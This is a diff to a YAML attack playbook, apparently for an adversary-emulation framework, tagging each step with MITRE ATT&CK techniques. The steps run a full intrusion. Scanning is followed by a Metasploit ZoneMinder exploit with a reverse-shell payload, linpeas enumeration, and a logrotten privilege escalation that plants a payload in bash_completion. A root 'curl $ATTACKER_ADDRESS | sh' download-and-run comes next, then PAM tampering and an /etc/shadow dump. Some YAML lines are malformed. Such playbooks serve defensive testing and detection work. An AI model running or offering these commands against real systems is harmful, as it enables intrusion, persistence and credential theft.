@@ -18,15 +18,31 @@ commands:
 
   - type: shell
     cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
+    metadata:
+      techniques: "T1590.002,T1591"
+      tactics: "Reconnaissance"
+      technique_name: "Gather Victim Network Information: DNS,Gather Victim Org Information"
 
   - type: shell
     cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
+    metadata:
+      techniques: "T1595,T1592.002"
+      tactics: "Reconnaissance"
+      technique_name: "Active Scanning,Gather Victim Host Information: Software
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
+    metadata:
+      techniques: "T1595.002"
+      tactics: "Reconnaissance"
+      technique_name: "Active Scanning: Vulnerability Scanning"
 
   - type: shell
     cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    metadata:
+      techniques: "T1595.003"
+      tactics: "Reconnaissance"
+      technique_name: "Active Scanning: Wordlist Scanning"
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
@@ -36,17 +52,27 @@ commands:
     payload_options:
       LHOST: 192.42.1.174
     payload: cmd/unix/python/meterpreter/reverse_tcp
-
+    metadata:
+      techniques: "T1190,T1059.006"
+      tactics: "Initial Access"
+      technique_name: "Exploit Public-Facing Application,Command and Scripting Interpreter: Python"
 
   - type: msf-session
     stdapi: True
     session: "foothold"
     cmd: cd /tmp
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
     cmd: upload /var/www/html/linpeas.sh
-
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     cmd: shell
@@ -55,31 +81,59 @@ commands:
   - type: msf-session
     cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
     session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
  
   - type: msf-session
     cmd: export SHELL=bash
     session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
  
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
  
   - type: msf-session
     cmd: stty rows 38 columns 116
     session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
 
   - type: msf-session
     cmd: 'export PS1="PWN >"'
     session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
 
   - type: msf-session
     cmd: chmod +x linpeas.sh
     session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
 
   - type: msf-session
     cmd: ./linpeas.sh -s -q -N 2> /dev/null
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1087,T1083,T1201,T1069,T1057,T1518,T1082,T1614,T1016,T1049,T1033,T1007,T1615"
+      tactics: "Discovery"
+      technique_name: "Account Discovery,File and Directory Discovery,Password Policy Discover,Permission Groups Discovery,Process Discovery,Software Discovery,System Information Discovery,System Location Discovery,System Network Configuration Discovery,System Network Connections Discovery,System Owner/User Discovery,System Service Discovery,Group Policy Discovery"
 
   # wait a little bit for linpeas
   - type: sleep
@@ -92,33 +146,65 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
 
   - type: msf-session
     cmd: "cd /var/www/default"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "rm -rf log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "mkdir log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "echo empty > log/accesss.log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: sleep
     seconds: 960
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "id"
@@ -128,7 +214,6 @@ commands:
   - type: msf-session
     cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
     session: "foothold"
-
 
   - type: ssh
     cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
@@ -153,14 +238,26 @@ commands:
   - type: msf-session
     cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
     session: "root"
- 
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
+      
   - type: msf-session
     cmd: export SHELL=bash
     session: "root"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
  
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: "root"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
  
   - type: msf-session
     cmd: stty rows 38 columns 116
@@ -169,10 +266,18 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
 
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+      metadata:
+      techniques: "T1105,T1556.003"
+      tactics: "Command and Control,Persistence,Credential Access"
+      technique_name:"Ingress Tool Transfer,Modify Authentication Process: Pluggable Authentication Modules"
 
   - type: sleep
     seconds: 40
@@ -181,18 +286,27 @@ commands:
     cmd: id
     read: True
     session: "root"
-
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
 
 # TODO: THIS COMMAND DOES NOT WORK
 #       DON'T KNOW WHY
 #  - type: msf-session
 #    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
 #    session: "root"
+#    metadata:
+#      techniques: "T1218,T1556.003"
+#      tactics: "Defense Evasion,Persistence,Credential Access"
+#      technique_name: "System Binary Proxy Execution,Modify Authentication Process: Pluggable Authentication Modules"
+
 #
 
 #  - type: msf-session
 #    cmd: rm /root/README.txt
 #    session: "root"
+
 
   - type: msf-session
     cmd: exit
@@ -213,6 +327,10 @@ commands:
     password: haveityourway
     creates_session: "rootshell"
     clear_cache: True
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
 
   - type: ssh
     cmd: pwd
@@ -221,19 +339,39 @@ commands:
   - type: ssh
     cmd: sudo cat /etc/shadow
     session: "rootshell"
+    metadata:
+      techniques: "T1003.008"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
 
   - type: ssh
     cmd: sudo lspci
     session: "rootshell"
+    metadata:
+      techniques: "T1120"
+      tactics: "Discovery"
+      technique_name: "Peripheral Device Discovery"
 
   - type: ssh
     cmd: sudo bash -c "command -v lsusb"
     session: "rootshell"
+    metadata:
+      techniques: "T1120"
+      tactics: "Discovery"
+      technique_name: "Peripheral Device Discovery"
 
   - type: ssh
     cmd: date
     session: "rootshell"
+    metadata:
+      techniques: "T1124"
+      tactics: "Discovery"
+      technique_name: "System Time Discovery"
 
   - type: ssh
     cmd: sudo find /usr -name \*virtualbox\*
     session: "rootshell"
+    metadata:
+      techniques: "T1497.001"
+      tactics: "Defense Evasion, Discovery"
+      technique_name: "Virtualization/Sandbox Evasion: System Checks"
